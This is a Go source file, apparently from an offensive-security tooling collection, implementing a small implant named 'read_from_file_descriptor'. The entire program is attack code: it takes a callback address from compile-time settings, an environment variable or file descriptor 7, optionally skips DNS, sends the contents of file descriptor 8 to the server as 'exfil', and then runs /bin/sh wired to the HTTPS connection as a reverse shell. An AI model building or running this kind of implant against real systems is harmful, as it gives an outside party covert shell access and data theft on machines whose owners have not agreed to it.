// Program read_from_file_descriptor - comms_without_dns but reads from a file
// descriptor
package main

/*
 * read_from_file_descriptor.go
 * comms_without_dns but reads from a file descriptor
 * By J. Stuart McMurray
 * Created 20240907
 * Last Modified 20240907
 */

import (
	"cmp"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

// Compile-time configurables
var (
	Address           = "https://localhost:4444/shell"
	AddressEnvVar     = "ALPT4ATS_ADDRESS"
	RealAddressEnvVar = "ALPT4ATS_REAL_ADDRESS"
)

const (
	// ConfFD is the file descriptor from which we might read our config.
	ConfFD = 7
	// FileFD is the file descriptor for a file to send back to the server.
	FileFD = 8
)

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)

	/* Config from file descriptor 7 overrides config from environment. */
	if _, err := fmt.Fscan(
		os.NewFile(uintptr(ConfFD), "config"),
		&Address,
	); nil != err && !errors.Is(err, io.EOF) &&
		!errors.Is(err, syscall.EBADF) {
		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
	}

	/* Don't do DNS resolution if we have a real address already. */
	if ra, ok := os.LookupEnv(RealAddressEnvVar); ok {
		dial := func(
			ctx context.Context,
			network, addr string,
		) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, ra)
		}
		http.DefaultTransport.(*http.Transport).DialContext = dial
	}

	/* Connect to the server. */
	pr, pw := io.Pipe()
	res, err := http.Post(Address, "", pr)
	if nil != err {
		log.Fatalf("HTTPS request error: %s", err)
	}

	/* Send back whatever's on the File FD. */
	if _, err := io.Copy(
		pw,
		os.NewFile(uintptr(FileFD), "exfil"),
	); nil != err {
		log.Printf("Error exfilling from FD %d: %s", FileFD, err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = res.Body
	sh.Stdout = pw
	sh.Stderr = pw
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
